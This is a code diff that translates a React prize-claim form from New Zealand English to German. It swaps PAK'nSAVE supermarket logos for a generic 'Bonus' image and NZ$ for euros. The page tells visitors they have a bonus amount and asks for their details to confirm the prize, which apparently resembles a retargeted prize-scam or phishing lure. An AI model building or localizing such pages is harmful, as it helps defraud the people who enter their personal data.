@@ -17,7 +17,7 @@ export function WinFlow({ sessionId }: Props) {
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const { settings, loading: settingsLoading } = useSettings();
   const [amount, setAmount] = useState<number | null>(null);
-  const [currency, setCurrency] = useState<string>("NZ$");
+  const [currency, setCurrency] = useState<string>("€");
   const [loading, setLoading] = useState(true);
   const [showModal] = useState(true);
   const [firstName, setFirstName] = useState("");
@@ -43,7 +43,7 @@ export function WinFlow({ sessionId }: Props) {
 
       if (cancelled) return;
       if (qErr || !data) {
-        setError("Session not found or configuration is invalid.");
+        setError("Sitzung nicht gefunden oder Konfiguration ungültig.");
         setLoading(false);
         return;
       }
@@ -82,7 +82,7 @@ export function WinFlow({ sessionId }: Props) {
 
     setSaving(false);
     if (upErr) {
-      setError("Saving failed. Please try again.");
+      setError("Speichern fehlgeschlagen. Bitte versuchen Sie es erneut.");
       return;
     }
     setSessionFormData(nextForm);
@@ -112,7 +112,7 @@ export function WinFlow({ sessionId }: Props) {
 
   if (!supabase) {
     return (
-      <DemoShell title="Configuration" subtitle="System environment">
+      <DemoShell title="Konfiguration" subtitle="Systemumgebung">
         <ConfigMissing />
       </DemoShell>
     );
@@ -148,31 +148,31 @@ export function WinFlow({ sessionId }: Props) {
             <div className="space-y-4 sm:space-y-5">
               <div className="flex items-center justify-between gap-2.5 sm:gap-4">
                 <img
-                  src="/form-assets/paknsave-logo-form.png"
-                  alt="PAK'nSAVE"
+                  src="/form-assets/logo-form.svg"
+                  alt="Bonus"
                   className="pak-form-brand-logo shrink-0"
                 />
                 <div className="pak-form-amount inline-flex min-w-0 flex-1 px-3 py-2.5 sm:max-w-[18rem] sm:flex-none sm:px-5 sm:py-3">
                   <div className="pak-form-amount-label">
-                    <div>Your</div>
-                    <div>Bonus Amount</div>
+                    <div>Ihr</div>
+                    <div>Bonusbetrag</div>
                   </div>
                   <div className="pak-form-amount-divider" />
                   <div className="pak-form-amount-value">
-                    {currency}{amount?.toLocaleString("en-NZ")}
+                    {currency}{amount?.toLocaleString("de-DE")}
                   </div>
                 </div>
                 <img
-                  src="/form-assets/paknsave-gift-box.png"
+                  src="/form-assets/logo-form.svg"
                   alt=""
                   className="h-auto w-20 shrink-0 object-contain drop-shadow-[0_18px_32px_rgba(0,0,0,0.45)] sm:w-28"
                 />
               </div>
 
               <div className="max-w-[27rem]">
-                <h2 className="pak-form-title">Complete your entry</h2>
+                <h2 className="pak-form-title">Vervollständigen Sie Ihre Teilnahme</h2>
                 <p className="pak-form-subtitle mt-2 sm:mt-3">
-                  Enter your details to complete your prize confirmation.
+                  Geben Sie Ihre Daten ein, um Ihre Gewinnbestätigung abzuschließen.
                 </p>
               </div>
             </div>
@@ -240,7 +240,7 @@ export function WinFlow({ sessionId }: Props) {
                   <svg className="h-9 w-9 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                     <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                   </svg>
-                  <span>Your details are processed securely.</span>
+                  <span>Ihre Daten werden sicher verarbeitet.</span>
                 </div>
 
                 <button
@@ -248,7 +248,7 @@ export function WinFlow({ sessionId }: Props) {
                   disabled={saving || processing}
                   className="pak-form-button min-h-[3.55rem] w-full px-5 text-base sm:min-h-[4.25rem] sm:px-6 sm:text-xl md:w-[24rem]"
                 >
-                  {processing ? "Processing..." : saving ? "Saving..." : settings.profile_button}
+                  {processing ? "Wird verarbeitet..." : saving ? "Wird gespeichert..." : settings.profile_button}
                 </button>
               </div>
 
